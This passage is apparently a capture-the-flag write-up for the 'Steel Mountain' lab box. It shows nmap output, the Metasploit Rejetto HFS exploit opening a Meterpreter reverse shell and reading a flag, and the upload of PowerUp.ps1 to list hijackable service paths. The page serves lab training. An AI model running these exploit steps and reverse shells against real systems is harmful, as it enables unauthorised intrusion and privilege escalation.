+SF:6\xf7\r\x01\x01\x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x0
+SF:1\0\xac\x10\xff\x1ba5C\x93\x12\xd4\x86\xc1/\xf4\^6\x19M\x8b\xf5\x9e\xb5
+SF:u\x06\x85\xc2i\xf5C\xeb\x0e&lt;JLg\xbb\xda\xec9\x20\xabu3ox\xea\xd3\|\xa4\
+SF:x92\r\xc6j\x03\xe6\xccG\xf5z\xf7oW5\x0b\xf5\x18\xe1Pfs\x89c\xeacfY\xfdC
+SF:\xb8\xc1\x90\xe7\x90M#\x06\xea\x1f\x94\x07\x9c\xe1Y\xcdT\x85\x96_\x99\x
+SF:dd\x9b\xdei\xb0\x18g;\xa6tQ\xba\"X!\xe1\xe0\xb67l\xdf\0\xef\xdf#\x02\x0
+SF:1M\xb9\xda\x83\xfe\x94\x14r\xc5#\xff\xb6\xe3\x91\xf4\xc2\x19's\xbc~\xd2
+SF:\xcet\xb2\xa7\xa4\+c\x10\xaas\x0b\xa2\x91\.\x96\xa1\x1dp\x1f\x1c\x05\x8
+SF:3\xaa\+7\xd8\xfa#\xf04\xae\xe6A\x9a\xba\x9f\x9e\xce\xfa\x17:p\x90\"\xf7
+SF:V\xb6l\0\xdc\xc1/\xa4\(z\xe37b\x94n\xc3l\xdb\x1b\xc4\"\xaa\xc1SJ\xdf-\x
+SF:fb\x17Kl\xb0W\x96\xa8\xf0\xde\x18/Xk\x8f\xb3\xf3\x16\x84\xe69\x8c\xda\x
+SF:a0=\xf8&gt;\x8e\x96\x11L/\xf1UG\xb9\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x0
+SF:3U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\
+SF:x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\
+SF:0\x03\x82\x01\x01\0\$\x92\x92\x962\xd1c\x08/l\x0b\xe8p\xa3\x89\xfc\xad\
+SF:x15}\xaa\x0c\xe0\xec\xf3\xaa\x82\x85\x0b\x80o\xfe2\x89I\xe5\xbb\x1a\xe4
+SF:\xd4{D:\xdc2\xcf\xab\nGiL\xd9\x96\xf5\$U\xe2\x84@\xc9\x03\xb6\xf3\xc2\x
+SF:8a\xf47%L\x97g\x8b\x0bmz\xadF\x05\x91\xaf\x17\xbf\xc2\xdb\x14\xe8TEd\x1
+SF:3\x83\0/\?\xcf\]\xfbs\?\xb8\xd0X\xb0U'\x1b\xc0\xc2\x87\xbe{\x1c\x1df\xd
+SF:5\xf5\xe6\xcf\xa6\xb1\"\x19\x10\xa5\x11\nuD\xe3\x99\\\x8e\xff\r&amp;@\x97\x
+SF:f8o-5u\xa0\x8fOV\xd2\x17\x07\x07\xe8\x20\xee\x8c\x99\x9c\x91Q&gt;\)@C\x91\
+SF:xc1I1\^\x1c\xa1_/\xf4\x0e\x81D\xd7zW\x9d\xe1\^\x9b\xc04\x04J\xed\xb4\xd
+SF:dW'P\xfc\xce\x93\xff\xca\xaeu\xf4\x8e\x19\xbf\xcdy&gt;\xec\x10N#\x03\xa0\x
+SF:1f\xd71\xfd\x87\xe3\)mk\x85\xce,\xa7h&gt;M\xe1&lt;\xa8\n\xf9-j\xf7\xc4@\xe9cc
+SF:\xd0s\x8d\xcd\x13\xe1\xd3_\xe5\xc2q\xb6\xbd\xd7\xc6\xa5\x0e\0\0\0");
+
+MAC Address: 02:9C:5A:A0:F7:B9 (Unknown)
+
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=4/27%OT=80%CT=1%CU=40904%PV=Y%DS=1%DC=D%G=Y%M=029C5A%T
+OS:M=60878300%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10F%TI=I%CI=I%TS=7
+OS:)SEQ(SP=100%GCD=1%ISR=10F%TI=I%CI=RD%II=I%SS=S%TS=7)OPS(O1=M2301NW8ST11%
+OS:O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301NW8ST11%O5=M2301NW8ST11%O6=M230
+OS:1ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T
+OS:=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
+OS:T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=
+OS:O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
+OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
+OS:RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%I
+OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:9c:5a:a0:f7:b9 (unknown)
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-04-27 04:20:26
+|_  start_date: 2021-04-27 04:14:25
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.62 ms &lt;hostname&gt; (&lt;ip&gt;)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.93 seconds
+</code></pre><p>Use <code>firefox</code> and load url <code>http://&lt;ip&gt;</code>. Right click on the page and use <code>View image info</code>, which will display image source and name as <code>http://&lt;ip&gt;/img/&lt;name&gt;.png</code>.</p><h2 id="task-2---initial-access">Task 2 - Initial Access</h2><h3 id="references-1">References</h3><ul><li><a href="http://www.rejetto.com/hfs/" target="_blank">Rejetto HFS</a><li><a href="https://www.exploit-db.com/exploits/34926" target="_blank">Rejetto HFS exploit</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-searchsploit" target="_blank">Searchsploit ref</a></ul><p>Use <code>firefox</code> to load the url <code>http://&lt;ip&gt;:8080</code> to get any info on the website source. The link to <code>HttpFileServer 2.3</code> directs to the <a href="http://www.rejetto.com/hfs/" target="_blank">Rejetto HFS</a></p><p>Use <code>searchsploit</code> to check if there are any exploits available for <code>rejetto 2</code> involving <code>metasploit</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="searchsploit%20%22rejetto%202%22" type="button"></button></div></div><pre><code>searchsploit "rejetto 2"
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="--------------------------------------------------------------------------%20---------------------------------%0AExploit%20Title%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20Path%0A--------------------------------------------------------------------------%20---------------------------------%0ARejetto%20HTTP%20File%20Server%20(HFS)%20-%20Remote%20Command%20Execution%20(Metasploit)%20%20%20%20%7C%20windows/remote/34926.rb%0ARejetto%20HTTP%20File%20Server%20(HFS)%201.5/2.x%20-%20Multiple%20Vulnerabilities%20%20%20%20%20%20%20%20%20%7C%20windows/remote/31056.py%0ARejetto%20HTTP%20File%20Server%20(HFS)%202.2/2.3%20-%20Arbitrary%20File%20Upload%20%20%20%20%20%20%20%20%20%20%20%20%7C%20multiple/remote/30850.txt%0ARejetto%20HTTP%20File%20Server%20(HFS)%202.3.x%20-%20Remote%20Command%20Execution%20(1)%20%20%20%20%20%20%20%7C%20windows/remote/34668.txt%0ARejetto%20HTTP%20File%20Server%20(HFS)%202.3.x%20-%20Remote%20Command%20Execution%20(2)%20%20%20%20%20%20%20%7C%20windows/remote/39161.py%0ARejetto%20HTTP%20File%20Server%20(HFS)%202.3a/2.3b/2.3c%20-%20Remote%20Command%20Execution%20%20%7C%20windows/webapps/34852.txt%0ARejetto%20HttpFileServer%202.3.x%20-%20Remote%20Command%20Execution%20(3)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20windows/webapps/49125.py%0A--------------------------------------------------------------------------%20---------------------------------%0AShellcodes:%20No%20Results" type="button"></button></div></div><pre><code>-------------------------------------------------------------------------- ---------------------------------
+Exploit Title                                                            |  Path
+-------------------------------------------------------------------------- ---------------------------------
+Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)    | windows/remote/34926.rb
+Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities         | windows/remote/31056.py
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload            | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)       | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)       | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution  | windows/webapps/34852.txt
+Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)               | windows/webapps/49125.py
+-------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>Use <code>msfconsole -q</code> to load the <code>rejetto</code> module and load the variables.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20search%20rejetto%0A%0AMatching%20Modules%0A%0A#%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disclosure%20Date%20%20Rank%20%20%20%20%20%20%20Check%20%20Description%0A-%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20---------------%20%20----%20%20%20%20%20%20%20-----%20%20-----------%0A0%20%20exploit/windows/http/rejetto_hfs_exec%20%202014-09-11%20%20%20%20%20%20%20excellent%20%20Yes%20%20%20%20Rejetto%20HttpFileServer%20Remote%20Command%20Execution%0A%0A%0Amsf5%20%3E%20use%20exploit/windows/http/rejetto_hfs_exec%0A[*]%20No%20payload%20configured,%20defaulting%20to%20windows/meterpreter/reverse_tcp%0A%0Amsf5%20exploit(windows/http/rejetto_hfs_exec)%20%3E%20show%20options%0A%0AModule%20options%20(exploit/windows/http/rejetto_hfs_exec):%0A%0AName%20%20%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20%20%20%20%20---------------%20%20--------%20%20-----------%0AHTTPDELAY%20%2010%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20Seconds%20to%20wait%20before%20terminating%20web%20server%0AProxies%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20A%20proxy%20chain%20of%20format%20type:host:port[,type:host:port][...]%0ARHOSTS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20host(s),%20range%20CIDR%20identifier,%20or%20hosts%20file%20with%20syntax%20'file:%3Cpath%3E'%0ARPORT%20%20%20%20%20%2080%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20target%20port%20(TCP)%0ASRVHOST%20%20%20%200.0.0.0%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20local%20host%20or%20network%20interface%20to%20listen%20on.%20This%20must%20be%20an%20address%20on%20the%20local%20machine%20or%200.0.0.0%20to%20listen%20on%20all%20addresses.%0ASRVPORT%20%20%20%208080%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20local%20port%20to%20listen%20on.%0ASSL%20%20%20%20%20%20%20%20false%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20Negotiate%20SSL/TLS%20for%20outgoing%20connections%0ASSLCert%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20Path%20to%20a%20custom%20SSL%20certificate%20(default%20is%20randomly%20generated)%0ATARGETURI%20%20/%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20path%20of%20the%20web%20application%0AURIPATH%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20The%20URI%20to%20use%20for%20this%20exploit%20(default%20is%20random)%0AVHOST%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20HTTP%20server%20virtual%20host%0A%0A%0APayload%20options%20(windows/meterpreter/reverse_tcp):%0A%0AName%20%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20%20%20%20---------------%20%20--------%20%20-----------%0AEXITFUNC%20%20process%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Exit%20technique%20(Accepted:%20'',%20seh,%20thread,%20process,%20none)%0ALHOST%20%20%20%20%20%3Csource-ip%3E%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20address%20(an%20interface%20may%20be%20specified)%0ALPORT%20%20%20%20%204444%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20port%0A%0A%0AExploit%20target:%0A%0AId%20%20Name%0A--%20%20----%0A0%20%20%20Automatic%0A%0A%0Amsf5%20exploit(windows/http/rejetto_hfs_exec)%20%3E%20set%20RHOSTS%20%3Ctarget-ip%3E%0ARHOSTS%20=%3E%20%3Ctarget-ip%3E%0A%0Amsf5%20exploit(windows/http/rejetto_hfs_exec)%20%3E%20set%20RPORT%208080%0ARPORT%20=%3E%208080" type="button"></button></div></div><pre><code>msf5 &gt; search rejetto
+
+Matching Modules
+
+#  Name                                   Disclosure Date  Rank       Check  Description
+-  ----                                   ---------------  ----       -----  -----------
+0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+msf5 &gt; use exploit/windows/http/rejetto_hfs_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf5 exploit(windows/http/rejetto_hfs_exec) &gt; show options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+HTTPDELAY  10               no        Seconds to wait before terminating web server
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+RPORT      80               yes       The target port (TCP)
+SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+SRVPORT    8080             yes       The local port to listen on.
+SSL        false            no        Negotiate SSL/TLS for outgoing connections
+SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+TARGETURI  /                yes       The path of the web application
+URIPATH                     no        The URI to use for this exploit (default is random)
+VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+LHOST     &lt;source-ip&gt;     yes       The listen address (an interface may be specified)
+LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Automatic
+
+
+msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOSTS &lt;target-ip&gt;
+RHOSTS =&gt; &lt;target-ip&gt;
+
+msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RPORT 8080
+RPORT =&gt; 8080
+</code></pre><p>Exploit to spawn <code>meterpreter</code> shell and get system info and flag.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(windows/http/rejetto_hfs_exec)%20%3E%20exploit%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Csource-ip%3E:4444%0A[*]%20Using%20URL:%20http://0.0.0.0:8080/AgvBfPcusrk%0A[*]%20Local%20IP:%20http://%3Csource-ip%3E:8080/AgvBfPcusrk%0A[*]%20Server%20started.%0A[*]%20Sending%20a%20malicious%20request%20to%20/%0A[*]%20Payload%20request%20received:%20/AgvBfPcusrk%0A[*]%20Sending%20stage%20(176195%20bytes)%20to%20%3Ctarget-ip%3E%0A[*]%20Meterpreter%20session%201%20opened%20(%3Csource-ip%3E:4444%20-%3E%20%3Ctarget-ip%3E:49231)%20at%202021-04-27%2004:42:14%20+0100%0A[!]%20Tried%20to%20delete%20%25TEMP%25%5CJatBAp.vbs,%20unknown%20result%0A[*]%20Server%20stopped.%0A%0Ameterpreter%20%3E%20sysinfo%0AComputer%20%20%20%20%20%20%20%20:%20STEELMOUNTAIN%0AOS%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Windows%202012%20R2%20(6.3%20Build%209600).%0AArchitecture%20%20%20%20:%20x64%0ASystem%20Language%20:%20en_US%0ADomain%20%20%20%20%20%20%20%20%20%20:%20WORKGROUP%0ALogged%20On%20Users%20:%201%0AMeterpreter%20%20%20%20%20:%20x86/windows%0Ameterpreter%20%3E%20getuid%0AServer%20username:%20STEELMOUNTAIN%5Cbill%0Ameterpreter%20%3E%20shell%0AProcess%202500%20created.%0AChannel%202%20created.%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3Etype%20C:%5CUsers%5Cbill%5CDesktop%5Cuser.txt%0Atype%20C:%5CUsers%5Cbill%5CDesktop%5Cuser.txt%0Ab04763b6fcf51fcd7c13abc7db4fd365%0A%0Ac:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3Eexit%0Aexit" type="button"></button></div></div><pre><code>msf5 exploit(windows/http/rejetto_hfs_exec) &gt; exploit
+
+[*] Started reverse TCP handler on &lt;source-ip&gt;:4444
+[*] Using URL: http://0.0.0.0:8080/AgvBfPcusrk
+[*] Local IP: http://&lt;source-ip&gt;:8080/AgvBfPcusrk
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /AgvBfPcusrk
+[*] Sending stage (176195 bytes) to &lt;target-ip&gt;
+[*] Meterpreter session 1 opened (&lt;source-ip&gt;:4444 -&gt; &lt;target-ip&gt;:49231) at 2021-04-27 04:42:14 +0100
+[!] Tried to delete %TEMP%\JatBAp.vbs, unknown result
+[*] Server stopped.
+
+meterpreter &gt; sysinfo
+Computer        : STEELMOUNTAIN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter &gt; getuid
+Server username: STEELMOUNTAIN\bill
+meterpreter &gt; shell
+Process 2500 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;type C:\Users\bill\Desktop\user.txt
+type C:\Users\bill\Desktop\user.txt
+b04763b6fcf51fcd7c13abc7db4fd365
+
+c:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;exit
+exit
+</code></pre><h2 id="task-3---privilege-escalation">Task 3 - Privilege Escalation</h2><h3 id="references-2">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">PowerUp Reference</a></ul><p>Download the <code>PowerUp.ps1</code> script using <code>wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</code>.</p><p>From the existing <code>meterpreter</code> shell in <code>msfconsole -q</code>, upload the <code>PowerUp.ps1</code> script and <code>source</code> the <code>functions</code> in them.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20upload%20/root/PowerUp.ps1%0A[*]%20uploading%20%20:%20/root/PowerUp.ps1%20-%3E%20PowerUp.ps1%0A[*]%20Uploaded%20586.51%20KiB%20of%20586.51%20KiB%20(100.0%25):%20/root/PowerUp.ps1%20-%3E%20PowerUp.ps1%0A[*]%20uploaded%20%20%20:%20/root/PowerUp.ps1%20-%3E%20PowerUp.ps1%0A%0Ameterpreter%20%3E%20load%20powershell%0ALoading%20extension%20powershell...Success.%0A%0Ameterpreter%20%3E%20powershell_shell%0A%0APS%20%3E%20pwd%0A%0APath%0AC:%5Cusers%5Cbill%5Cdesktop%0A%0APS%20%3E%20.%20.%5CPowerUp.ps1" type="button"></button></div></div><pre><code>meterpreter &gt; upload /root/PowerUp.ps1
+[*] uploading  : /root/PowerUp.ps1 -&gt; PowerUp.ps1
+[*] Uploaded 586.51 KiB of 586.51 KiB (100.0%): /root/PowerUp.ps1 -&gt; PowerUp.ps1
+[*] uploaded   : /root/PowerUp.ps1 -&gt; PowerUp.ps1
+
+meterpreter &gt; load powershell
+Loading extension powershell...Success.
+
+meterpreter &gt; powershell_shell
+
+PS &gt; pwd
+
+Path
+C:\users\bill\desktop
+
+PS &gt; . .\PowerUp.ps1
+</code></pre><p>Execute the <code>invoke-allchecks</code> cmdlet.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="PS%20%3E%20invoke-allchecks%0A%0AServiceName%20%20%20%20:%20AdvancedSystemCareService9%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=AppendData/AddSubdirectory%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'AdvancedSystemCareService9'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20True%0AName%20%20%20%20%20%20%20%20%20%20%20:%20AdvancedSystemCareService9%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20AdvancedSystemCareService9%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=WriteData/AddFile%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'AdvancedSystemCareService9'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20True%0AName%20%20%20%20%20%20%20%20%20%20%20:%20AdvancedSystemCareService9%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20AdvancedSystemCareService9%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5CProgram%20Files%20(x86)%5CIObit;%20IdentityReference=STEELMOUNTAIN%5Cbill;%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Permissions=System.Object[]%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'AdvancedSystemCareService9'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20True%0AName%20%20%20%20%20%20%20%20%20%20%20:%20AdvancedSystemCareService9%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20AdvancedSystemCareService9%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe;%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20IdentityReference=STEELMOUNTAIN%5Cbill;%20Permissions=System.Object[]%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'AdvancedSystemCareService9'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20True%0AName%20%20%20%20%20%20%20%20%20%20%20:%20AdvancedSystemCareService9%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20AWSLiteAgent%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%5CAmazon%5CXenTools%5CLiteAgent.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=AppendData/AddSubdirectory%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'AWSLiteAgent'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20AWSLiteAgent%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20AWSLiteAgent%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%5CAmazon%5CXenTools%5CLiteAgent.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=WriteData/AddFile%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'AWSLiteAgent'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20AWSLiteAgent%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20IObitUnSvr%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CIObit%20Uninstaller%5CIUService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=AppendData/AddSubdirectory%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'IObitUnSvr'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20IObitUnSvr%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20IObitUnSvr%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CIObit%20Uninstaller%5CIUService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=WriteData/AddFile%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'IObitUnSvr'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20IObitUnSvr%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20IObitUnSvr%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CIObit%20Uninstaller%5CIUService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5CProgram%20Files%20(x86)%5CIObit;%20IdentityReference=STEELMOUNTAIN%5Cbill;%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Permissions=System.Object[]%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'IObitUnSvr'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20IObitUnSvr%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20IObitUnSvr%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CIObit%20Uninstaller%5CIUService.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5CProgram%20Files%20(x86)%5CIObit%5CIO